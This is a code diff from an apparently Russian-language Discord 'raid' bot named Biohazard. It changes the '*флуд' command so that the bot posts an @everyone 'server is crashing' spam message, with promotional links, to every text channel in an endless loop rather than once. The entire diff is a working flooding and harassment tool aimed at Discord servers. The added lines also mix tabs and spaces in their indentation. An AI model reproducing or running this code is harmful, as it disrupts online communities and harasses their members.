@@ -79,8 +79,9 @@ class MyClient(discord.Client):
 			if message.content == '*флуд': #флуд
 				spam = '@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/Aw3SgrC'
 				await message.delete()
-				for i in message.guild.text_channels:
-					await i.send(spam)
+				while True:
+            				for channel in message.guild.text_channels:
+                				await channel.send(spam)
 					
 						
 				
